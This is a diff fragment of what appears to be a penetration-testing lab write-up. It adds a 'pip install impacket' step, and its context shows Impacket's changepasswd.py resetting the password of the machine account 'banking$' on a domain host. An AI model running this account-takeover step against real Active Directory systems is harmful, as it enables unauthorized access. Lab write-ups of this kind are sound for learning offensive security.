@@ -243,6 +243,9 @@ session setup failed: NT_STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
 /usr/share/doc/python3-impacket/examples/changepasswd.py
 [★]$ cp /usr/share/doc/python3-impacket/examples/changepasswd.py .
 
+[★]$ pip install impacket
+
+
 [★]$ python3  changepasswd.py retro.vl/'banking$':banking@10.129.234.44 -newpass 'qwerty1!' -p rpc-samr
 Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
